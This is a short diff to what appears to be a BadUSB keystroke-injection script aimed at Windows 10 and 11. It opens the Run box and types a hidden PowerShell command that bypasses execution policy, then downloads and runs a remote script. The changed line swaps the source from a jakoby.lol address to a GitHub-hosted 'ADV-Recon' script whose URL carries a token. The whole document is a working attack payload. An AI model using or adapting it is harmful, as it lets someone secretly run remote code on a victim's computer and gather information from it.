@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 1500
-STRING powershell -w h -NoP -Ep Bypass irm jakoby.lol/9nb | iex
+STRING powershell -w h -NoP -Ep Bypass irm https://raw.githubusercontent.com/TibiaGibon/fz/main/ADV-Recon/ADV-Recon.ps1?token=GHSAT0AAAAAACNW22M7ZRP2RGEQRGPZCN32ZN7TX4A | iex
 ENTER
